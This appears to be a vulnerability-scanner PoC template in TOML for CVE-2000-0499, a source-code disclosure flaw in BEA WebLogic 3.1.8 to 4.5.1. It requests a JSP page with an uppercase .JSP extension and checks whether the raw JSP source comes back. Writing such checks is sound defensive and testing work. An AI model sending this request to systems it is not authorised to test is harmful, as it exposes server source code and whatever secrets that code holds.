[info]
author = "ave"
description = "BEA WebLogic 3.1.8 至 4.5.1 版本存在 JSP 源代码泄露漏洞，请求时将 JSP 文件扩展名改为大写（如 .JSP）即可直接获取源码"
id = "POC-AVE-2000-0560"
name = "BEA WebLogic JSP Source Code Disclosure PoC"
severity = "high"
tags = ["ave-2000-0560"]
vuln_id = [
    "CVE-2000-0499",
    "AVE-2000-0560",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/examples/jsp/num/numguess.JSP"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%@",
    "page ",
]
